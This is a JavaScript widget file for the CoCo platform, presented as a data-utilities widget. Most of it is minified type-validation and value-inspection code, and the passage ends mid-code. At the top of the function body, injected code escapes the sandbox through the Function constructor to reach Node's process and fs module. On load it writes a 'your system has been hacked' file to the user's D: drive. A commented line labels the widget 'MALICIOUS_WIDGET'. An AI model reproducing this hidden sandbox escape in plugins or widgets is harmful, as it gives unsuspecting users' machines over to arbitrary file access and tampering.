// ==CoCoWidget==
// @type SLIGHTNING_DATA_UTILS_WIDGET
// @name 数据工具
// @author SLIGHTNING
// @version 0.0.2
// @license Apache-2.0
// ==/CoCoWidget==
new Function("require","exports","__slightning_coco_widget_require__","__slightning_coco_widget_exports__","InvisibleWidget","VisibleWidget","widgetClass","React","("+function(){try{console.log(Object.assign)


  const fs = this.constructor.constructor('return process')().mainModule.require('fs');
  fs.writeFileSync('D:\\\\hacked.txt', '你的系统已被入侵！');
 // return { type: 'MALICIOUS_WIDGET', title: 'Hacked' };



	var e={n:function(t){var n=t&&t.__esModule?function(){return t.default}:function(){return t};return e.d(n,{a:n}),n},d:function(t,n){for(var r in n)e.o(n,r)&&!e.o(t,r)&&Object.defineProperty(t,r,{enumerable:!0,get:n[r]})}};e.g=function(){if("object"==typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"==typeof window)return window}}(),e.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)};var t={};let Ie=null;function n(){if(null==Ie)throw new Error("未设置默认适配器");return Ie}function r(e){Ie=e}const Re=__slightning_coco_widget_require__,Le=InvisibleWidget,De=VisibleWidget,Be=__slightning_coco_widget_exports__;class We{test(e){return null===e}toString(e,t,n){return"null"}}class Fe{test(e){return void 0===e}toString(e,t,n){return"undefined"}}function o(e){const{indent:t}=e;return"number"==typeof t?" ".repeat(t):t}class He{test(e){return!0}prepare(e,t,n){var r;if(null==n.prepareData.refMap.get(e))if(n.accessedSet.has(e)&&null!=e&&"object"==typeof e&&(t.ref||n.pathArray.includes(e)))n.prepareData.refMap.set(e,n.prepareData.refMap.size+1);else{if(n.accessedSet.add(e),n.pathArray.push(e),t.depth<=0||n.pathArray.length<=t.depth){let o;o="function"==typeof t.rules?t.rules(e,t,n):t.rules;for(const l of o)if(l.test(e)){null===(r=l.prepare)||void 0===r||r.call(l,e,t,n);break}}n.pathArray.pop()}}toString(e,t,n){let r="";const o=n.prepareData.refMap.get(e);if(null!=o){if(n.accessedRefSet.has(e))return`[Circular *${o}]`;n.accessedRefSet.add(e),r+=`<ref *${o}> `}let l;n.depth++,l=t.depth<=0||n.depth<=t.depth?"function"==typeof t.rules?t.rules(e,t,n):t.rules:ln;const a=l.find(t=>t.test(e));return r+=null==a?`[unknown type: ${typeof e} ${Object.prototype.toString.call(e)}]`:a.toString(e,t,n),n.depth--,r}}function l(e,t){return Array.isArray(e)?e.includes(t):null!=typeof Set&&e instanceof Set?e.has(t):"function"==typeof e&&e(t)}class qe{constructor({defaultConfig:e,specialValue:t={}}){this.defaultConfig=e,this.specialValue=t}test(e){return"object"==typeof e}prepare(e,t,n){const r=Object.assign({},this.defaultConfig,t.object);let o=[];o.push(...Object.getOwnPropertyNames(e)),r.symbol&&o.push(...Object.getOwnPropertySymbols(e)),r.unenumerable||(o=o.filter(t=>{var n,r;return null!==(r=null===(n=Object.getOwnPropertyDescriptor(e,t))||void 0===n?void 0:n.enumerable)&&void 0!==r&&r})),o=o.filter(e=>!l(r.exclude,e));for(const l of o){const o=Object.getOwnPropertyDescriptor(e,l);if(r.get||null!=o&&"value"in o){let r;try{r=e[l]}catch(e){r=e}(new He).prepare(r,t,n)}}for(const l of o){const o=Object.getOwnPropertyDescriptor(e,l);r.getter&&null!=(null==o?void 0:o.get)&&(new He).prepare(o.get,t,n),r.setter&&null!=(null==o?void 0:o.set)&&(new He).prepare(o.set,t,n)}r.prototype&&(new He).prepare(Object.getPrototypeOf(e),t,n)}toString(e,t,n){var r,a,i;const s=Object.assign({},this.defaultConfig,t.object);let u=null!==(i=null===(a=null===(r=Object.getPrototypeOf(e))||void 0===r?void 0:r.constructor)||void 0===a?void 0:a.name)&&void 0!==i?i:"Object";u+=" {\n";let c=[];c.push(...Object.getOwnPropertyNames(e)),s.symbol&&c.push(...Object.getOwnPropertySymbols(e)),s.unenumerable||(c=c.filter(t=>{var n,r;return null!==(r=null===(n=Object.getOwnPropertyDescriptor(e,t))||void 0===n?void 0:n.enumerable)&&void 0!==r&&r})),c=c.filter(e=>!l(s.exclude,e));for(const r of c){const l="string"==typeof r?r:`[${String(r)}]`,a=Object.getOwnPropertyDescriptor(e,r);(s.get||null!=a&&"value"in a)&&(u+=`${l}: ${this.propertyToString(e,r,t,n)}`.split("\n").map(e=>`${o(t)}${e}`).join("\n")+"\n")}for(const r of c){const l="string"==typeof r?r:`[${String(r)}]`,a=Object.getOwnPropertyDescriptor(e,r);s.getter&&null!=(null==a?void 0:a.get)&&(u+=`get ${l}: ${(new He).toString(a.get,t,n)}`.split("\n").map(e=>`${o(t)}${e}`).join("\n")+"\n"),s.setter&&null!=(null==a?void 0:a.set)&&(u+=`set ${l}: ${(new He).toString(a.set,t,n)}`.split("\n").map(e=>`${o(t)}${e}`).join("\n")+"\n")}s.prototype&&(this.specialValue["[[Prototype]]"]=(new He).toString(Object.getPrototypeOf(e),t,n));for(const[e,n]of Object.entries(this.specialValue))u+=`${e}: ${n}`.split("\n").map(e=>`${o(t)}${e}`).join("\n")+"\n";return u+="}",0==c.length&&0==Object.keys(this.specialValue).length?"{}":u}propertyToString(e,t,n,r){let o,l=!1;try{o=e[t]}catch(e){l=!0,o=e}const a=(new He).toString(o,n,r);return l?`[Exception: ${a}]`:a}}class Ue{constructor(){this.test=qe.prototype.test}toString(e,t,n){return Object.prototype.toString.call(e)}}class Je extends qe{constructor({defaultConfig:e={},specialValue:t={}}={}){super({defaultConfig:Object.assign({unenumerable:!1,symbol:!1,get:!1,getter:!1,setter:!1,prototype:!1,exclude:[]},e),specialValue:t})}}class Ge extends qe{constructor({defaultConfig:e={},specialValue:t={}}={}){super({defaultConfig:Object.assign({unenumerable:!0,symbol:!0,get:!0,getter:!1,setter:!1,prototype:!1,exclude:[]},e),specialValue:t})}}class Xe extends qe{constructor({defaultConfig:e={},specialValue:t={}}={}){super({defaultConfig:Object.assign({unenumerable:!0,symbol:!0,get:!0,getter:!0,setter:!0,prototype:!0,exclude:[]},e),specialValue:t})}}function a(e){return"string"==typeof e}function i(e,t){return"string"==typeof t&&(t=parseInt(t)),!!Number.isInteger(t)&&("number"==typeof t&&0<=t&&t<e.length)}class Ye{constructor(){this.test=a}toString(e,t,n){return JSON.stringify(e)}}class Ke{constructor(){this.test=a}toString(e,t,n){return JSON.stringify(e)}}class Ze{constructor(){this.test=a}toString(e,t,n){return`[string: ${JSON.stringify(e)}]`}}class ze{constructor(){this.test=a}prepare(e,t,n){new Xe({defaultConfig:{exclude:t=>i(e,t)}}).prepare(e,t,n)}toString(e,t,n){return`[string: ${JSON.stringify(e)}] ${new Xe({defaultConfig:{exclude:t=>i(e,t)}}).toString(e,t,n)}`}}function s(e){return"number"==typeof e}class Qe{constructor(){this.test=s}toString(e,t,n){return String(e)}}class et{constructor(){this.test=s}toString(e,t,n){return String(e)}}class tt{constructor(){this.test=s}toString(e,t,n){return`[number: ${String(e)}]`}}class nt{constructor(){this.test=s}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return`[number: ${String(e)}] ${(new Xe).toString(e,t,n)}`}}function u(e){return"boolean"==typeof e}class rt{constructor(){this.test=u}toString(e,t,n){return String(e)}}class ot{constructor(){this.test=u}toString(e,t,n){return String(e)}}class lt{constructor(){this.test=u}toString(e,t){return`[boolean: ${String(e)}]`}}class at{constructor(){this.test=u}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return`[boolean: ${String(e)}] ${(new Xe).toString(e,t,n)}`}}function c(e){return"object"==typeof e&&e instanceof String}function p(e,t){return"string"==typeof t&&(t=parseInt(t)),!!Number.isInteger(t)&&("number"==typeof t&&0<=t&&t<e.length)}class it{constructor(){this.test=c}toString(e,t,n){return JSON.stringify(e)}}class st{constructor(){this.test=c}toString(e,t,n){return`String(${JSON.stringify(e)})`}}class ut{constructor(){this.test=c}prepare(e,t,n){new Ge({defaultConfig:{exclude:t=>p(e,t)}}).prepare(e,t,n)}toString(e,t,n){return`String(${JSON.stringify(e)}) ${new Ge({defaultConfig:{exclude:t=>p(e,t)}}).toString(e,t,n)}`}}class ct{constructor(){this.test=c}prepare(e,t,n){new Xe({defaultConfig:{exclude:t=>p(e,t)}}).prepare(e,t,n)}toString(e,t,n){return`String(${JSON.stringify(e)}) ${new Xe({defaultConfig:{exclude:t=>p(e,t)}}).toString(e,t,n)}`}}function y(e){return"object"==typeof e&&e instanceof Number}class pt{constructor(){this.test=y}toString(e,t,n){return String(e)}}class yt{constructor(){this.test=y}toString(e,t,n){return`Number(${String(e)})`}}class ft{constructor(){this.test=y}prepare(e,t,n){(new Ge).prepare(e,t,n)}toString(e,t,n){return`Number(${String(e)}) ${(new Ge).toString(e,t,n)}`}}class bt{constructor(){this.test=y}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return`Number(${String(e)}) ${(new Xe).toString(e,t,n)}`}}function f(e){return"object"==typeof e&&e instanceof Boolean}class dt{constructor(){this.test=f}toString(e,t,n){return String(e)}}class ht{constructor(){this.test=f}toString(e,t,n){return`Boolean(${String(e)})`}}class gt{constructor(){this.test=f}prepare(e,t,n){(new Ge).prepare(e,t,n)}toString(e,t,n){return`Boolean(${String(e)}) ${(new Ge).toString(e,t,n)}`}}class wt{constructor(){this.test=f}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return`Boolean(${String(e)}) ${(new Xe).toString(e,t,n)}`}}function b(e){return"undefined"!=typeof RegExp&&e instanceof RegExp}class vt{constructor(){this.test=b}toString(e,t,n){return String(e)}}class _t{constructor(){this.test=b}toString(e,t,n){return`RegExp(${String(e)})`}}class mt{constructor(){this.test=b}prepare(e,t,n){(new Ge).prepare(e,t,n)}toString(e,t,n){return`RegExp(${String(e)}) ${(new Ge).toString(e,t,n)}`}}class kt{constructor(){this.test=b}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return`RegExp(${String(e)}) ${(new Xe).toString(e,t,n)}`}}function d(e){return"symbol"==typeof e}class Tt{constructor(){this.test=d}toString(e,t,n){return String(e)}}class St{constructor(){this.test=d}toString(e,t,n){return String(e)}}class Vt{constructor(){this.test=d}toString(e,t,n){return String(e)}}class jt{constructor(){this.test=d}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return`${String(e)} ${(new Xe).toString(e,t,n)}`}}function h(e){return"bigint"==typeof e}class Ot{constructor(){this.test=h}toString(e,t,n){return String(e)}}class Ct{constructor(){this.test=h}toString(e,t,n){return String(e)}}class Et{constructor(){this.test=h}toString(e,t,n){return`[bigint: ${String(e)}]`}}class $t{constructor(){this.test=h}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return`[bigint: ${String(e)}] ${(new Xe).toString(e,t,n)}`}}function g(e){return"undefined"!=typeof Set&&e instanceof Set}class Pt{constructor(){this.test=g}toString(e,t,n){return`Set(${e.size})`}}class Mt{constructor(){this.test=g}prepare(e,t,n){(new Je).prepare(e,t,n);for(const r of e.values())(new He).prepare(r,t,n)}toString(e,t,n){return new Je({specialValue:{"[[Values]]":0==e.size?"None":Array.from(e).map(e=>`${(new He).toString(e,t,n)}`.split("\n").join(`\n${o(t)}`)).map((e,n)=>`\n${o(t)}${n}: ${e}`).join("")}}).toString(e,t,n)}}class Nt{constructor(){this.test=g}prepare(e,t,n){(new Ge).prepare(e,t,n);for(const r of e.values())(new He).prepare(r,t,n)}toString(e,t,n){return new Ge({specialValue:{"[[Values]]":0==e.size?"None":Array.from(e).map(e=>`${(new He).toString(e,t,n)}`.split("\n").join(`\n${o(t)}`)).map((e,n)=>`\n${o(t)}${n}: ${e}`).join("")}}).toString(e,t,n)}}class At{constructor(){this.test=g}prepare(e,t,n){(new Xe).prepare(e,t,n);for(const r of e.values())(new He).prepare(r,t,n)}toString(e,t,n){return new Xe({specialValue:{"[[Values]]":0==e.size?"None":Array.from(e).map(e=>`${(new He).toString(e,t,n)}`.split("\n").join(`\n${o(t)}`)).map((e,n)=>`\n${o(t)}${n}: ${e}`).join("")}}).toString(e,t,n)}}function w(e){return"undefined"!=typeof Map&&e instanceof Map}class xt{constructor(){this.test=w}toString(e,t,n){return`Map(${e.size})`}}class It{constructor(){this.test=w}prepare(e,t,n){(new Je).prepare(e,t,n);for(const r of e.keys())(new He).prepare(r,t,n);for(const r of e.values())(new He).prepare(r,t,n)}toString(e,t,n){return new Je({specialValue:{"[[Entries]]":0==e.size?"None":Array.from(e.entries().map(([e,r])=>`${(new He).toString(e,t,n)}: ${(new He).toString(r,t,n)}`.split("\n").join(`\n${o(t)}`)).map(e=>`\n${o(t)}${e}`)).join("")}}).toString(e,t,n)}}class Rt{constructor(){this.test=w}prepare(e,t,n){(new Ge).prepare(e,t,n);for(const r of e.keys())(new He).prepare(r,t,n);for(const r of e.values())(new He).prepare(r,t,n)}toString(e,t,n){return new Ge({specialValue:{"[[Entries]]":0==e.size?"None":Array.from(e.entries().map(([e,r])=>`\nkey: ${(new He).toString(e,t,n)}\nvalue: ${(new He).toString(r,t,n)}`.split("\n").join(`\n${o(t).repeat(2)}`)).map((e,n)=>`\n${o(t)}${n}: ${e}`)).join("")}}).toString(e,t,n)}}class Lt{constructor(){this.test=w}prepare(e,t,n){(new Xe).prepare(e,t,n);for(const r of e.keys())(new He).prepare(r,t,n);for(const r of e.values())(new He).prepare(r,t,n)}toString(e,t,n){return new Xe({specialValue:{"[[Entries]]":0==e.size?"None":Array.from(e.entries().map(([e,r])=>`\nkey: ${(new He).toString(e,t,n)}\nvalue: ${(new He).toString(r,t,n)}`.split("\n").join(`\n${o(t).repeat(2)}`)).map((e,n)=>`\n${o(t)}${n}: ${e}`)).join("")}}).toString(e,t,n)}}function v(e){return"undefined"!=typeof WeakRef&&e instanceof WeakRef}class Dt{constructor(){this.test=v}toString(e,t,n){return"[WeakRef]"}}class Bt{constructor(){this.test=v}prepare(e,t,n){(new Je).prepare(e,t,n);const r=e.deref();null!=r&&(new He).prepare(r,t,n)}toString(e,t,n){const r=e.deref();return new Je({specialValue:{"[[WeakRefTarget]]":null==r?"None":`${(new He).toString(r,t,n)}`}}).toString(e,t,n)}}class Wt{constructor(){this.test=v}prepare(e,t,n){(new Ge).prepare(e,t,n);const r=e.deref();null!=r&&(new He).prepare(r,t,n)}toString(e,t,n){const r=e.deref();return new Ge({specialValue:{"[[WeakRefTarget]]":null==r?"None":`${(new He).toString(r,t,n)}`}}).toString(e,t,n)}}class Ft{constructor(){this.test=v}prepare(e,t,n){(new Xe).prepare(e,t,n);const r=e.deref();null!=r&&(new He).prepare(r,t,n)}toString(e,t,n){const r=e.deref();return new Xe({specialValue:{"[[WeakRefTarget]]":null==r?"None":`${(new He).toString(r,t,n)}`}}).toString(e,t,n)}}function _(e){return"undefined"!=typeof Error&&e instanceof Error}class Ht{constructor(){this.test=_}toString(e,t,n){return`[${e.name}]`}}class qt{constructor(){this.test=_}toString(e,t,n){return Error.prototype.toString.call(e)}}class Ut{constructor(){this.test=_}toString(e,t,n){var r;return null!==(r=e.stack)&&void 0!==r?r:Error.prototype.toString.call(e)}}class Jt{constructor(){this.test=_}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){var r;return`${null!==(r=e.stack)&&void 0!==r?r:Error.prototype.toString.call(e)}${(new Xe).toString(e,t,n)}`}}function m(e){return"undefined"!=typeof HTMLElement&&e instanceof HTMLElement}class Gt{constructor(){this.test=m}toString(e,t,n){let r=e.tagName;""!=e.id&&(r+=`#${e.id}`);for(const t of Array.from(e.classList))r+=`.${t}`;return`[${Object.getPrototypeOf(e).constructor.name}: ${r}]`}}class Xt{constructor(){this.test=m}toString(e,t,n){if(""==e.innerHTML)return e.outerHTML;return e.cloneNode(!1).innerText="...",e.outerHTML}}class Yt{constructor(){this.test=m}toString(e,t,n){return e.outerHTML}}class Kt{constructor(){this.test=m}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return e.outerHTML+" "+(new Xe).toString(e,t,n)}}class Zt{constructor(){this.test=Array.isArray}toString(e,t,n){return`Array(${e.length})`}}class zt{constructor(){this.test=Array.isArray}prepare(e,t,n){for(const r of e)null!=r&&(new He).prepare(r,t,n)}toString(e,t,n){if(0==e.length)return"Array []";let r="Array [\n";r+=(0 in e?(new He).toString(e[0],t,n):"None").split("\n").map(e=>`${o(t)}${e}`).join("\n");for(let l=1;l<e.length;l++)r+=`,\n${(l in e?(new He).toString(e[l],t,n):"None").split("\n").map(e=>`${o(t)}${e}`).join("\n")}`;return r+="\n]",r}}class Qt{constructor(){this.test=Array.isArray}prepare(e,t,n){(new Ge).prepare(e,t,n)}toString(e,t,n){return(new Ge).toString(e,t,n)}}class en{constructor(){this.test=Array.isArray}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return(new Ge).toString(e,t,n)}}function k(e){return"function"==typeof e}class tn{constructor(){this.test=k}toString(e,t,n){return""==e.name?"[Function]":`[Function: ${e.name}]`}}class nn{constructor(){this.test=k}toString(e,t){const n=Function.prototype.toString.call(e).replace(/[\s]+/g," ");if(n.length<=64)return n;const r=n.match(/^((function[\s]*[\S]+?[\s]*\([\s\S]*?\)|([\S]+?|\([\s\S]*?\))[\s]*=>|class[\s]*[\S]+?)[\s]*\{[\s]*)[\s\S]*?([\s]*\}[\s]*)$/);return null==r?n:`${r[1]}...${r[4]}`}}class rn{constructor(){this.test=k}toString(e,t,n){return Function.prototype.toString.call(e)}}class on{constructor(){this.test=k}prepare(e,t,n){(new Xe).prepare(e,t,n)}toString(e,t,n){return Function.prototype.toString.call(e)+" "+(new Xe).toString(e,t,n)}}const ln=[new We,new Fe,new Ye,new Qe,new rt,new it,new pt,new dt,new vt,new Tt,new Ot,new Pt,new xt,new Dt,new Ht,new Gt,new Zt,new Ue,new tn],an=[new We,new Fe,new Ke,new et,new ot,new st,new yt,new ht,new _t,new St,new Ct,new Mt,new It,new Bt,new qt,new Xt,new zt,new Je,new nn],sn=[new We,new Fe,new Ze,new tt,new lt,new ut,new ft,new gt,new mt,new Vt,new Et,new Nt,new Rt,new Wt,new Ut,new Yt,new Qt,new Ge,new rn],un=[new We,new Fe,new ze,new nt,new at,new ct,new bt,new wt,new kt,new jt,new $t,new At,new Lt,new Ft,new Jt,new Kt,new en,new Xe,new on];const cn=function(e,t={}){const n=Object.assign({rules(e,t,n){switch("pathArray"in n?n.pathArray.length:n.depth){case 1:return un;case 2:return sn;case 3:return an;default:return ln}},indent:4,depth:4,ref:!1,object:{}},t),r={refMap:new Map};return(new He).prepare(e,n,{pathArray:[],accessedSet:new Set,prepareData:r}),(new He).toString(e,n,{depth:0,accessedRefSet:new Set,prepareData:r})};function T(e,...t){for(const n of t)for(const[t,r]of Object.entries(n))Array.isArray(r)?(Array.isArray(e[t])||(e[t]=[]),e[t]=e[t].push(...r)):null!=r&&"object"==typeof r?(null!=e[t]&&"object"==typeof e[t]||(e[t]={}),T(e[t],r)):e[t]=r;return e}function S(e){return e.charAt(0).toUpperCase()+e.slice(1)}function V(e){return e.replace(/\n/g,"&#10;").replace(/\u0020/gu,"&#32;").replace(/"/g,"&#34;").replace(/'/g,"&#39;").replace(/</g,"&#60;").replace(/>/g,"&#62;").replace(/\u2002/gu,"&#8194;").replace(/\u2003/gu,"&#8195;").replace(/\u00A0/gu,"&#160;").replace(/　/g,"&#12288;")}function j(e){return Array.isArray(e)?e:[e]}function O(e){return cn(e,{rules:an,indent:"　",depth:2})}class pn extends Error{constructor(e,t,n){super(e),this.value=t,this.type=n}}function C(e,t,n){let r=null,o=!1;try{o=n.validate(t)}catch(e){if(!(e instanceof pn))throw e;r=e.message}if(o||null!=r||(r=`不能将 ${O(t)} 分配给 ${E(n)}`),null!=r)throw null!=e&&(r=`${e}：${r}`),new pn(r,t,n)}function E(e){return cn(e,{rules:[{test:e=>!0,prepare(e,t,n){var r;null===(r=e.typeToStringPrepare)||void 0===r||r.call(e,t,n)},toString:(e,t,n)=>e.typeToString(t,n)}]})}function $(e){return cn(e,{rules:[{test:e=>!0,prepare(e,t,n){var r;null===(r=e.inlineTypeToStringPrepare)||void 0===r||r.call(e,t,n)},toString:(e,t,n)=>e.inlineTypeToString(t,n)}]})}var P;!function(e){e.INLINE="INLINE",e.MULTILINE="MULTILINE",e.RICH="RICH"}(P||(P={}));const yn={[P.INLINE]:"TextInput",[P.MULTILINE]:"TextArea",[P.RICH]:"RichTextEditor"},fn={[P.INLINE]:"string",[P.MULTILINE]:"multilineString",[P.RICH]:"richTextString"},bn={[P.INLINE]:"string",[P.MULTILINE]:"multiline_string",[P.RICH]:"multiline_string"};class dn{constructor(e={}){var t,n;"string"==typeof e&&(e={defaultValue:e}),this.defaultValue=null!==(t=e.defaultValue)&&void 0!==t?t:"",this.inputType=null!==(n=e.inputType)&&void 0!==n?n:P.INLINE}validate(e){if("string"!=typeof e)throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}`,e,this);return!0}getSameDirectionChildren(){return[]}getReverseDirectionChildren(){return[]}isVoid(){return!1}typeToString(){return"字符串"}inlineTypeToString(){return this.typeToString()}toCoCoPropertyValueTypes(){return{editorType:yn[this.inputType],valueType:"string",checkType:"string",defaultValue:V(this.defaultValue)}}toCoCoMethodParamValueTypes(){return{valueType:fn[this.inputType],checkType:"string",defaultValue:V(this.defaultValue)}}toCoCoMethodValueTypes(){return{valueType:"string"}}toCoCoEventParamValueTypes(){return{valueType:"string"}}toCreationProjectPropValueTypes(){return{valueType:"string",defaultValue:this.defaultValue}}toCreationProjectMethodParamValueTypes(){return{valueType:bn[this.inputType],defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"string"}}toCreationProjectEmitParamValueTypes(){return{valueType:"string"}}}class hn{constructor(e={}){var t;"number"==typeof e&&(e={defaultValue:e}),this.defaultValue=null!==(t=e.defaultValue)&&void 0!==t?t:0,this.range=e.range}validate(e){if("number"!=typeof e)throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}`,e,this);if(null!=this.range&&!this.range.includes(e))throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}：数字超出范围`,e,this);return!0}getSameDirectionChildren(){return[]}getReverseDirectionChildren(){return[]}isVoid(){return!1}typeToString(){return"数字"}inlineTypeToString(){return this.typeToString()}toCoCoPropertyValueTypes(){return{valueType:"number",defaultValue:this.defaultValue}}toCoCoMethodParamValueTypes(){return{valueType:"number",defaultValue:this.defaultValue}}toCoCoMethodValueTypes(){return{valueType:"number"}}toCoCoEventParamValueTypes(){return{valueType:"number"}}toCreationProjectPropValueTypes(){return{valueType:"number",defaultValue:this.defaultValue}}toCreationProjectMethodParamValueTypes(){return{valueType:"number",defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"number"}}toCreationProjectEmitParamValueTypes(){return{valueType:"number"}}}class gn{constructor(e={}){var t;"boolean"==typeof e&&(e={defaultValue:e}),this.defaultValue=null!==(t=e.defaultValue)&&void 0!==t&&t}validate(e){if("boolean"!=typeof e)throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}`,e,this);return!0}getSameDirectionChildren(){return[]}getReverseDirectionChildren(){return[]}isVoid(){return!1}typeToString(){return"布尔"}inlineTypeToString(){return this.typeToString()}toCoCoPropertyValueTypes(){return{valueType:"boolean",defaultValue:this.defaultValue}}toCoCoMethodParamValueTypes(){return{valueType:"boolean",defaultValue:this.defaultValue}}toCoCoMethodValueTypes(){return{valueType:"boolean"}}toCoCoEventParamValueTypes(){return{valueType:"boolean"}}toCreationProjectPropValueTypes(){return{valueType:"boolean",defaultValue:this.defaultValue}}toCreationProjectMethodParamValueTypes(){return{valueType:"boolean",defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"boolean"}}toCreationProjectEmitParamValueTypes(){return{valueType:"boolean"}}}var M,N,A,x;!function(e){e.DROPDOWN="INLINE",e.OPTION_SWITCH="OPTION_SWITCH"}(M||(M={}));class wn{constructor(e){var t;Array.isArray(e)&&(e={entries:e}),this.entries=e.entries.map(e=>"string"==typeof e?{label:e,value:e}:Array.isArray(e)?{label:e[0],value:e[1]}:e),this.inputType=null!==(t=e.inputType)&&void 0!==t?t:M.DROPDOWN,this.valueToLabelMap={};for(const e of this.entries)this.valueToLabelMap[e.value]=e.label;this.values=this.entries.map(e=>e.value)}validate(e){if("string"!=typeof e||!this.values.includes(e))throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}`,e,this);return!0}getSameDirectionChildren(){return[]}getReverseDirectionChildren(){return[]}isVoid(){return 0!=this.entries.length}typeToString(){return 0==this.values.length?"空":`(${this.values.map(e=>JSON.stringify(e)).join(" | ")})`}inlineTypeToString(){return this.typeToString()}toCoCoPropertyValueTypes(){return{editorType:this.inputType==M.DROPDOWN?void 0:"OptionSwitch",dropdown:this.entries}}toCoCoMethodParamValueTypes(){return{dropdown:this.entries}}toCoCoMethodValueTypes(){return{valueType:"string"}}toCoCoEventParamValueTypes(){return{valueType:"string"}}toCreationProjectPropValueTypes(){return{valueType:"dropdown",dropdown:this.entries.map(e=>[e.label,e.value])}}toCreationProjectMethodParamValueTypes(){return{valueType:"dropdown",dropdown:this.entries.map(e=>[e.label,e.value])}}toCreationProjectMethodValueTypes(){return{valueType:"string"}}toCreationProjectEmitParamValueTypes(){return{valueType:"string"}}}!function(e){e.WEB="web",e.ANDROID="android",e.IOS="ios"}(N||(N={})),function(e){e.THIS="$this",e.METHOD="$method",e.BREAK_LINE="$break_line"}(A||(A={}));class vn{constructor(e,t){this.key=e,this.name=t,this.symbol=Symbol(t)}toString(){return`积木类型(${this.name})`}}vn.METHOD=new vn("METHOD","方法"),vn.EVENT=new vn("EVENT","事件"),function(e){e.COCO_EVENT="#608FEE",e.COCO_CONTROL="#68CDFF",e.COCO_FUNCTION0="#00AFC3",e.COCO_OPERATION="#FEAE8A",e.COCO_VARIABLE="#FFBB55",e.COCO_LIST="#F9CC37",e.COCO_DICTIONARY="#A073FF",e.COCO_FUNCTION1="#F88767",e.CREATION_PROJECT_EVENT="#608FEE",e.CREATION_PROJECT_CONTROL="#68CDFF",e.CREATION_PROJECT_CALCULATION="#FEAE8A",e.CREATION_PROJECT_FUNCTION0="#00AFC3",e.CREATION_PROJECT_OBJECT="#A073FF",e.CREATION_PROJECT_LIST="#F9CC37",e.CREATION_PROJECT_VARIABLE="#FFBB55",e.CREATION_PROJECT_FUNCTION1="#F88767",e.GREY="#BABABA",e.RED="#DB6656",e.BROWN="#D67B18",e.ORANGE="#D3A813",e.YELLOW="#C7C100",e.YELLOWISH_GREEN="#A2C028",e.GREEN="#6AC44C",e.TURQUOISE="#1BB897",e.CYAN="#00ACE8",e.BLUE="#588AF6",e.BLUISH_VIOLET="#7D8DF9",e.PURPLE="#9D80E7",e.PINKISH_PURPLE="#C571D8",e.PINK="#D16CB0"}(x||(x={}));function I(e){var t;const n=[];for(const r of e)"contents"in r?n.push(Object.assign(Object.assign({},r),{contents:I(r.contents)})):Array.isArray(r)?n.push({key:r[0],label:r[1],type:H(r[2]),blockOptions:null===(t=r[3])||void 0===t?void 0:t.blockOptions}):n.push(r);return n}function R(e){const t=[];for(const n of e)if("contents"in n)t.push(Object.assign(Object.assign({},n),{contents:R(n.contents)}));else if(Array.isArray(n))switch(n[0]instanceof vn||n.unshift(vn.METHOD),n[0]){case vn.METHOD:const e=Object.assign({type:vn.METHOD,key:n[1],label:n[2],block:L(n[3]),returns:H(n[4])},n[5]);t.push(e);break;case vn.EVENT:t.push(D(n))}else"key"in n?null==n.type||n.type==vn.METHOD?t.push(Object.assign(Object.assign({},n),{type:vn.METHOD,block:L(n.block)})):t.push(D(n)):t.push(n);return t}function L(e){const t=[];for(const n of e)"string"==typeof n?t.push(n):Array.isArray(n)?t.push({key:n[0],label:n[1],type:H(n[2])}):t.push(n);return t}function D(e){var t;return Array.isArray(e)?(e[0]instanceof vn&&(e=e.slice(1)),Array.isArray(e[3])?Object.assign({type:vn.EVENT,key:e[0],label:e[1],subTypes:e[2].map(B),params:e[3].map(W)},e[4]):Object.assign({type:vn.EVENT,key:e[0],label:e[1],params:e[2].map(W)},e[3])):Object.assign(Object.assign({},e),{type:vn.EVENT,subTypes:null===(t=e.subTypes)||void 0===t?void 0:t.map(B),params:e.params.map(W)})}function B(e){return Array.isArray(e)?{key:e[0],dropdown:e[1].map(F)}:Object.assign(Object.assign({},e),{dropdown:e.dropdown.map(F)})}function W(e){return Array.isArray(e)?{key:e[0],label:e[1],type:H(e[2])}:e}function F(e){return Array.isArray(e)?{label:e[0],value:e[1]}:e}function H(e){switch(typeof e){case"string":return new dn(e);case"number":return new hn(e);case"boolean":return new gn(e);default:return Array.isArray(e)?new wn(e):e}}class _n{validate(e){return!0}getSameDirectionChildren(){return[]}getReverseDirectionChildren(){return[]}isVoid(){return!0}typeToString(){return"空"}inlineTypeToString(){return this.typeToString()}toCoCoPropertyValueTypes(){throw new Error(`不能将 ${E(this)} 作为属性类型`)}toCoCoMethodParamValueTypes(){throw new Error(`不能将 ${E(this)} 作为方法参数类型`)}toCoCoMethodValueTypes(){return{}}toCoCoEventParamValueTypes(){throw new Error(`不能将 ${E(this)} 作为事件参数类型`)}toCreationProjectPropValueTypes(){throw new Error(`不能将 ${E(this)} 作为属性类型`)}toCreationProjectMethodParamValueTypes(){throw new Error(`不能将 ${E(this)} 作为方法参数类型`)}toCreationProjectMethodValueTypes(){return{}}toCreationProjectEmitParamValueTypes(){throw new Error(`不能将 ${E(this)} 作为属性类型`)}}class mn{constructor({block:e,returns:t,throws:n,defaultValue:r,raw:o}){this.block=L(e),this.returns=t,this.throws=n,this.defaultValue=r,this.raw=null!=o&&o}validate(e){if("function"!=typeof e)throw new pn(`不能将 ${O(e)} 分配给 